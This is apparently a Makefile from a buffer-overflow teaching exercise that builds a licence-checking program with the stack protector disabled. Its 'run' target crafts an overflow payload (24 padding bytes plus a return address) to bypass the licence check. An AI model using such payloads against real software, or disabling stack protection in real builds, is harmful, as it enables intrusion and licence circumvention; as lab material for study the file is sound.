CFLAGS = -fno-stack-protector -g3 -std=c11 -pedantic -Wall -Werror

all: genuine

genuine: bof.c
	$(CC) $(CFLAGS) $+ -o $@


runf:
	./genuine full.ver

runt:
	./genuine trial.ver

run:
	perl -e 'print "a"x24 . "\xd3\x06\x40"' > attack.ver && ./genuine attack.ver
# 4006d3
# 400769

clean:
	rm -rf genuine* test core*
